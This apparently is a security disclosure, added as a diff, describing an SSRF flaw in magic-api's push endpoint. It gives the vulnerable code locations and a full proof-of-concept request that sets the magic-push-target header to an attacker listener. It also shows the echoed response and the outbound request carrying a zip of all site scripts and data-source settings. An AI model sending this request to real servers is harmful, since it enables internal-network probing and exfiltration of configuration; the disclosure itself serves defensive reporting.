@@ -1,0 +1,77 @@
+Vulnerability Title: Push Interface SSRF (Response Echo + Site-wide Resource Packet)
+
+Vulnerability Location
+
+- `magic-api/.../core/web/MagicWorkbenchController.java#L319-L327`: `target` comes from the request header `magic-push-target`
+
+- `magic-api/.../core/service/impl/DefaultMagicAPIService.java#L145-L175`: Directly `restTemplate.postForObject(target, ...)`, **the response body is returned to the caller**
+
+Vulnerability Reproduction
+
+Request packet (target → magic-api):
+
+POST /magic/web/push HTTP/1.1
+Host: 192.168.26.129:9999
+Content-Type: application/json
+magic-push-target: http://192.168.26.1:8899/ssrf-test
+magic-push-secret-key: x
+magic-push-mode: full
+Content-Length: 3
+
+[]
+
+Return packet (third-party response is returned as is, data/message is the content returned by our listener):
+
+HTTP/1.1 200
+
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Methods: GET,POST,OPTIONS,PUT,DELETE
+
+Content-Type: application/json
+
+Transfer-Encoding: chunked
+Date: Tue, 13 Oct 2026 10:43:41 GMT
+
+{"code":1,"message":"SSRF-LISTENER-ON-192.168.26.1","data":"pong","timestamp":1791888000000,"executeTime":null}
+
+The message received by our listener (192.168.26.1:8899) proves that it is an outbound request initiated by the target, and the request body carries the exported full site resources:
+
+POST /ssrf-test HTTP/1.1
+Accept: application/json, application/*+json
+Content-Type: multipart/form-data;boundary=aaFEKk5K2iGePaoTyVpHga8-B8mY4N
+User-Agent: Java/1.8.0_442
+Host: 192.168.26.1:8899
+Connection: keep-alive
+Content-Length: 1827
+
+--aaFEKk5K2iGePaoTyVpHga8-B8mY4N
+Content-Disposition: form-data; name="timestamp"
+Content-Type: application/json
+
+1791888220669
+--aaFEKk5K2iGePaoTyVpHga8-B8mY4N
+Content-Disposition: form-data; name="mode"
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 4
+
+full
+--aaFEKk5K2iGePaoTyVpHga8-B8mY4N
+Content-Disposition: form-data; name="sign"
+Content-Type: text/plain;charset=UTF-8
+
+Content-Length: 32
+
+88489d0d51808905531435d00073e659
+
+--aaFEKk5K2iGePaoTyVpHga8-B8mY4N
+
+Content-Disposition: form-data; name="file"; filename="magic-api.zip"
+
+Content-Type: application/zip
+
+Content-Length: 1175
+
+PK.....（zip binary, 1175 bytes in total）
+
+Besides SSRF attacks on internal networks and echoing internal network responses, POST /magic/web/push will package the entire site's API scripts + group/data source configurations and send them to any address specified by the attacker, forming a data outbound channel (this is an additional risk not listed in the original report).
